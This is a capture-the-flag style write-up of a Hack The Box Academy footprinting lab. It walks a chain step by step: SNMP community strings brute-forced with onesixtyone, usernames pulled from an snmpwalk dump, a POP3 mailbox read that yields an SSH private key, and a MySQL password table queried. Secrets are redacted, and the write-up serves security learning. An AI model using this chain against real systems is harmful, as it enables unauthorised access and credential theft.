# HTB Academy – Footprinting Lab (Hard)

> **Disclaimer**
>
> This write-up is intended for educational purposes only. Sensitive information such as IP addresses, credentials, community strings, SSH keys, and the final answer have been redacted to avoid publishing a full solution.

---

# Objective

The objective of this lab was to enumerate a Linux management server and gather information from multiple services in order to obtain the credentials of an internal account.

---

# Tools Used

- Nmap
- OneSixtyOne
- SNMPWalk
- Netcat
- OpenSSH
- MySQL Client

---

# 1. UDP Enumeration

The initial step was to scan UDP services.

```bash
sudo nmap -sU -sV -p161 x.x.x.x
```

Output:

```text
161/udp open  snmp  net-snmp SNMPv3 server
```

Although the service was identified as SNMPv3, additional testing was performed to determine whether the server also accepted SNMPv2 community strings.

---

# 2. SNMP Community String Enumeration

The default community strings were unsuccessful.

A larger wordlist was created by combining all available SNMP community string lists from SecLists.

```bash
cat /usr/share/seclists/Discovery/SNMP/*.txt | sort -u > all-snmp.txt
```

The enumeration was repeated.

```bash
onesixtyone -c all-snmp.txt x.x.x.x
```

Output:

```text
Scanning 1 hosts, 3223 communities

x.x.x.x [REDACTED] Linux "Name" ...
```

A valid SNMP community string was successfully discovered.

---

# 3. Dumping SNMP Information

After obtaining the valid community string, the complete SNMP tree was exported.

```bash
snmpwalk -v2c -c <COMMUNITY_STRING> x.x.x.x > snmp.txt
```

To quickly identify interesting information, the following command was used.

```bash
grep -Ei "user|login|pass|password|home|ssh|mail|htb|account|cred" snmp.txt
```

Output:

```text
Admin <tech@inlanefreight.htb>

...

Changing password for tom.
```

At this point, a valid username was identified, together with evidence that password management operations were taking place.

---

# 4. Mail Service Enumeration

Using the credentials obtained during enumeration, a connection was established to the POP3 service.

```bash
nc x.x.x.x 110
```

Authentication:

```text
USER tom
PASS <PASSWORD>
```

Listing available messages:

```text
LIST
```

Reading the message:

```text
RETR 1
```

The mailbox contained an OpenSSH private key.

```text
-----BEGIN OPENSSH PRIVATE KEY-----

[REDACTED]

-----END OPENSSH PRIVATE KEY-----
```

---

# 5. SSH Access

The private key was saved locally.

```bash
chmod 600 id_rsa
```

SSH login:

```bash
ssh -i id_rsa tom@x.x.x.x
```

The login was successful.

---

# 6. Local Enumeration

The home directory contained several interesting files.

```bash
ls -la
```

One file immediately stood out.

```text
~/.mysql_history
```

Reading its contents:

```bash
cat ~/.mysql_history
```

Output:

```text
show databases;
use users;
select * from users;
```

The history revealed the existence of a MySQL database named **users**.

---

# 7. Database Enumeration

Login to MySQL:

```bash
mysql -u tom -p
```

Selecting the database:

```sql
use users;
```

Querying the target account:

```sql
SELECT * FROM users WHERE username = 'HTB';
```

Output:

```text
+------+----------+------------------------------+
| id   | username | password                     |
+------+----------+------------------------------+
| ***  | HTB      | **************************** |
+------+----------+------------------------------+
```

The required credentials were successfully recovered.

---

# Key Takeaways

- UDP services should always be included during reconnaissance.
- A service identified as SNMPv3 may still accept SNMPv2 community strings.
- Large community string wordlists can reveal non-default configurations.
- SNMP can expose valuable information that leads to credentials.
- Mail services may contain sensitive information such as SSH private keys.
- Local history files (`.mysql_history`, `.bash_history`, etc.) are valuable sources of information during post-exploitation.
- Enumeration is often a chain of small discoveries rather than a single exploit.

---

# Skills Practiced

- UDP Enumeration
- SNMP Enumeration
- Community String Discovery
- Information Gathering
- POP3 Enumeration
- SSH Authentication using Private Keys
- Linux Local Enumeration
- MySQL Enumeration

---

**Platform:** Hack The Box Academy

**Module:** Footprinting

**Difficulty:** Hard
